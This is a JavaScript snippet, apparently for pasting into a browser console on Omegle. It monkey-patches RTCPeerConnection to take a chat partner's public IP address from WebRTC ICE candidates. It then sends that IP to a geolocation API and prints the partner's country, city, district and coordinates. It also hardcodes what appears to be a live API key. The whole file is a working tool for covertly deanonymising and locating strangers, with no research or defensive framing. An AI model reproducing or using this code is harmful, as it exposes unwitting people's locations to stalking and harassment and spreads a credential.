const apiKey = "bc268f1a66b04f43b3f71ecb90007001"
oRTCPeerConnection  = RTCPeerConnection

RTCPeerConnection = function(...args) {
	const omegleLocator = new oRTCPeerConnection(...args)

	omegleLocator.oaddIceCandidate = omegleLocator.addIceCandidate

	omegleLocator.addIceCandidate = function(iceCandidate) {
		const file = iceCandidate.candidate.split(' ')
		if (file[7] === 'srflx') {
			console.clear()
			fetchLocation(file[4])
		}
		return omegleLocator.oaddIceCandidate(iceCandidate)
	}

	return omegleLocator
}

const fetchLocation = async(ip) =>{
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

    await fetch(url).then((response) =>
        response.json().then((json) => {
            const output = `
                ---------------------------
                Country: ${json.country_name}
                State: ${json.state_prov}
                City: ${json.city}
                District: ${json.district}
                Lat / Long: (${json.latitude}, ${json.longitude})
                ---------------------------
                `;
            console.log(output);
        })
    );
};